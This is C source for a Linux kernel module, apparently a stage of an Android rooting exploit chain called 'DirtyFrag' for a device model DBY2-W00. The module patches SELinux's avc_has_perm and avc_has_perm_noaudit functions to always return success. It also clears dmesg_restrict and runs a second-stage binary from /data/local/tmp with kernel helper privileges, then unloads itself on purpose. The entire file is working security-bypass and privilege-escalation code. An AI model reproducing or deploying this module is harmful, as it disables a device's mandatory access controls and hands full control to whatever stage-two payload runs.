/*
 * DirtyFrag bootstrap module for DBY2-W00.
 *
 * The module is loaded by /vendor/bin/insmod from the vendor_modprobe domain.
 * It patches the two SELinux AVC entry points so later module loads cannot be
 * denied by a stale policy decision. Its init then fails on purpose, which
 * makes the kernel unload it immediately.
 */
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/umh.h>

#ifndef DFROOT_HELPER_PATH
#define DFROOT_HELPER_PATH "/data/local/tmp/dfroot-stage2"
#endif

typedef int (*instruction_patch_t)(void *addresses[], u32 instructions[],
                                   int instruction_count);

static __nocfi void patch_function_to_return_zero(void *function_address) {
  instruction_patch_t patch_instructions =
      (instruction_patch_t)kallsyms_lookup_name("aarch64_insn_patch_text");
  void *patch_addresses[3] = {
      function_address,
      (char *)function_address + 4,
      (char *)function_address + 8,
  };
  u32 patch_instructions_data[3] = {
      0xd503245f, /* BTI C, a NOP on CPUs without BTI enforcement. */
      0xd2800000, /* mov x0, #0 */
      0xd65f03c0, /* ret */
  };
  int result;

  if (!patch_instructions) {
    pr_err("dfroot_boot: aarch64_insn_patch_text unavailable\n");
    return;
  }

  result = patch_instructions(patch_addresses, patch_instructions_data, 3);
  pr_info("dfroot_boot: patched %px result=%d\n", function_address, result);
}

static void publish_boot_marker(void) {
  int *dmesg_restrict = (int *)kallsyms_lookup_name("dmesg_restrict");

  if (dmesg_restrict) {
    WRITE_ONCE(*dmesg_restrict, 0);
    pr_info("dfroot_boot: dmesg_restrict cleared\n");
  }
}

static void start_stage2(void) {
  static const char helper_path[] = DFROOT_HELPER_PATH;
  static char *arguments[] = {
      (char *)helper_path,
      NULL,
  };
  static char *environment[] = {
      (char *)"PATH=/system/bin:/vendor/bin",
      NULL,
  };

  struct subprocess_info *helper =
      call_usermodehelper_setup(helper_path, arguments, environment,
                                GFP_KERNEL, NULL, NULL, NULL);
  int result;

  if (!helper) {
    pr_err("dfroot_boot: stage2 setup failed\n");
    return;
  }

  /* CONFIG_STATIC_USERMODEHELPER_PATH="" replaces path during setup. */
  helper->path = helper_path;
  result = call_usermodehelper_exec(helper, UMH_WAIT_EXEC);
  pr_info("dfroot_boot: stage2 exec result=%d\n", result);
}

static int __nocfi __init dfroot_boot_init(void) {
  void *avc_has_perm = (void *)kallsyms_lookup_name("avc_has_perm");
  void *avc_has_perm_noaudit =
      (void *)kallsyms_lookup_name("avc_has_perm_noaudit");

  if (!avc_has_perm || !avc_has_perm_noaudit) {
    pr_err("dfroot_boot: AVC symbols unavailable (%px, %px)\n",
           avc_has_perm, avc_has_perm_noaudit);
    return -ENOENT;
  }

  patch_function_to_return_zero(avc_has_perm);
  patch_function_to_return_zero(avc_has_perm_noaudit);
  pr_info("dfroot_boot: SELinux AVC checks disabled\n");
  publish_boot_marker();
  start_stage2();

  /* Returning an error unloads this module immediately after the patch. */
  return -ENODEV;
}

static void __exit dfroot_boot_exit(void) {}

module_init(dfroot_boot_init);
module_exit(dfroot_boot_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("DirtyFrag SELinux bootstrap for DBY2-W00");
